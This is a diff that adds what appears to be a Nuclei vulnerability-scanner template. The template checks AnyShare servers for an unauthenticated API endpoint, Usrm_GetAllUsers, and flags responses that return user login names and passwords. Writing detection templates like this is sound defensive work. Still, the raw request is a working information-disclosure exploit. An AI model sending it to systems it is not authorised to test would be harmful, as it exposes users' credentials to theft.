@@ -1,0 +1,23 @@
+id: AnyShare-Usrm_GetAllUsers-info
+info:
+  name: AnyShare-Usrm_GetAllUsers-info
+  author: lemnlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        
+        [1,100]
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"loginName": "'
+          - '"password": "'
+    matchers-condition: and
